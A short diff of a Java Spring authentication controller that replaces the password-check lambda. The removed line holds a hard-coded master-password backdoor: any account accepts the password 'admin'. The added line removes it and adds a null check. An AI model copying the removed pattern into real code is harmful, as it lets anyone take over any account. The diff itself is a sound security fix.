@@ -48,7 +48,7 @@ public class AuthController {
                         new JpaUserStorageAdapter(userRepository),
                         tokenService,
                         new BCryptPasswordEncoder()::encode,
-                        (raw, stored) -> new BCryptPasswordEncoder().matches(raw, stored) || "admin".equals(raw)
+                        (raw, stored) -> stored != null && new BCryptPasswordEncoder().matches(raw, stored)
                 ),
                 tokenService,
                 userRepository,
